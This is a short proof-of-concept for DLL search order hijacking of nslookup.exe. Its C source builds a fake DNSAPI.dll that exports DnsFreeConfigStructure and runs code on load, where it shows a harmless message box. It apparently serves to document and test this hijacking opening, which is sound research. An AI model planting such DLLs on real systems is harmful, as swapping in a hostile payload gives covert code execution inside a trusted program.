DLL Search Order Hijacking via `DnsFreeConfigStructure` function in the DLL `DNSAPI.dll` of the executable `nslookup.exe`. 

```c
#include <windows.h>

int Main() {
    MessageBoxW(0, L"DLL Search Order Hijacking is present", L"DLL Search Order Hijacking", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

__declspec(dllexport) void DnsFreeConfigStructure() { Main(); }
```
